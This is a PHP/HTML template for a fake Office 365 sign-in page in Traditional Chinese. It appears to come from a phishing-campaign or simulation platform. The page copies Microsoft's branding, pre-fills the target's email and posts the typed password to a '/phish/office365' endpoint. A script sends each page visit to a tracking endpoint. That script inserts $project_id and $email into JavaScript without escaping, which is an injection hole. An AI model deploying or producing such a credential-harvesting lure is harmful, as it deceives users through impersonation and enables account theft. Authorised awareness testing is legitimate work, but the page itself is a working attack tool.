<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登入 - Office 365</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .login-container {
            min-height: 100vh;
            background: linear-gradient(135deg, #0078d4 0%, #005a9f 100%);
        }
        
        .login-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            max-width: 440px;
            width: 100%;
        }
        
        .microsoft-logo {
            width: 108px;
            height: 24px;
            margin-bottom: 20px;
        }
        
        .login-title {
            font-size: 24px;
            font-weight: 600;
            color: #323130;
            margin-bottom: 8px;
        }
        
        .login-subtitle {
            color: #605e5c;
            font-size: 15px;
            margin-bottom: 24px;
        }
        
        .form-control {
            border: 1px solid #605e5c;
            border-radius: 2px;
            height: 48px;
            font-size: 15px;
        }
        
        .form-control:focus {
            border-color: #0078d4;
            box-shadow: none;
        }
        
        .btn-login {
            background-color: #0078d4;
            border: none;
            border-radius: 2px;
            height: 48px;
            font-size: 15px;
            font-weight: 600;
        }
        
        .btn-login:hover {
            background-color: #005a9f;
        }
        
        .error-message {
            color: #d13438;
            font-size: 13px;
            margin-bottom: 16px;
            display: flex;
            align-items: flex-start;
        }
        
        .error-icon {
            margin-right: 8px;
            margin-top: 1px;
        }
    </style>
</head>
<body>
    <div class="login-container d-flex align-items-center justify-content-center p-3">
        <div class="login-card p-4">
            <!-- Microsoft Logo -->
            <svg class="microsoft-logo" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M44.836 11.932V23h-2.172V7.098h2.113l8.338 11.83V7.098H55.287V23h-2.113l-8.338-11.068z" fill="#5F5F5F"/>
                <path d="M60.78 7.098c2.113 0 3.926.737 5.438 2.21 1.512 1.474 2.268 3.256 2.268 5.346s-.756 3.872-2.268 5.346c-1.512 1.474-3.325 2.21-5.438 2.21-2.113 0-3.926-.736-5.438-2.21-1.512-1.474-2.268-3.256-2.268-5.346s.756-3.872 2.268-5.346c1.512-1.473 3.325-2.21 5.438-2.21zm0 1.918c-1.512 0-2.8.543-3.864 1.63-1.064 1.087-1.596 2.398-1.596 3.934s.532 2.847 1.596 3.934c1.064 1.087 2.352 1.63 3.864 1.63s2.8-.543 3.864-1.63c1.064-1.087 1.596-2.398 1.596-3.934s-.532-2.847-1.596-3.934c-1.064-1.087-2.352-1.63-3.864-1.63z" fill="#5F5F5F"/>
            </svg>
            
            <h1 class="login-title">登入</h1>
            <?php if (isset($email)): ?>
            <div class="login-subtitle"><?php echo htmlspecialchars($email); ?></div>
            <?php endif; ?>
            
            <?php if (isset($error)): ?>
            <div class="error-message">
                <span class="error-icon">⚠</span>
                <div>
                    <div style="font-weight: 600;">登入失敗</div>
                    <div><?php echo htmlspecialchars($error); ?></div>
                </div>
            </div>
            <?php endif; ?>
            
            <form method="POST" action="/phish/office365" id="loginForm">
                <input type="hidden" name="project_id" value="<?php echo htmlspecialchars($project_id); ?>">
                <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
                <input type="hidden" name="attempts" value="<?php echo $attempts ?? 0; ?>">
                
                <div class="mb-3">
                    <input type="email" 
                           class="form-control" 
                           name="username" 
                           placeholder="電子郵件、電話或 Skype" 
                           value="<?php echo htmlspecialchars($email ?? ''); ?>"
                           required>
                </div>
                
                <div class="mb-3">
                    <input type="password" 
                           class="form-control" 
                           name="password" 
                           placeholder="密碼" 
                           required>
                </div>
                
                <div class="mb-3">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="keepSignedIn">
                        <label class="form-check-label text-muted" for="keepSignedIn" style="font-size: 13px;">
                            保持登入狀態
                        </label>
                    </div>
                </div>
                
                <button type="submit" class="btn btn-primary btn-login w-100 mb-3">登入</button>
                
                <div class="text-center">
                    <a href="#" class="text-decoration-none" style="font-size: 13px;">無法存取您的帳戶？</a>
                </div>
            </form>
            
            <div class="mt-4 pt-3 border-top">
                <div class="text-center">
                    <a href="#" class="text-decoration-none" style="font-size: 13px;">建立帳戶！</a>
                </div>
            </div>
        </div>
    </div>
    
    <script>
    // 記錄頁面訪問
    if (typeof project_id !== 'undefined' && typeof email !== 'undefined') {
        fetch('/track/page', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                project_id: '<?php echo $project_id; ?>',
                email: '<?php echo $email; ?>',
                page_type: 'office365'
            })
        });
    }
    
    // 表單提交處理
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        // 不阻止表單提交，讓後端處理
    });
    </script>
</body>
</html>